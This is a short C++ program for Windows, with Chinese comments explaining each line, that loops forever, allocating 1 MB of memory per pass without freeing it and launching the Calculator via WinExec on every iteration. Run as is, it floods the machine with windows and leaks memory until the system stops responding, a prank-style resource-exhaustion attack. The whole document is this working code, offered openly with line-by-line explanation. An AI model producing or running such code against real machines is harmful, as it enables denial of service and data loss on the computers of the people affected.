//前面四行#include開頭的是導入會用到的標頭檔

//第六行的while(1)是為了不斷重複執行

//第七行的malloc(0x100000)是命令系統分配出1M的記憶體

//第八行的WinExec("calc",SW_NORMAL)是開啟計算機

#include<iostream>

#include<stdio.h>

#include<windows.h>

#include<stdlib.h>

int main(int argc, char** argv) {

while (1) {

malloc(0x100000);

WinExec("calc",SW_NORMAL); }

return 0; }
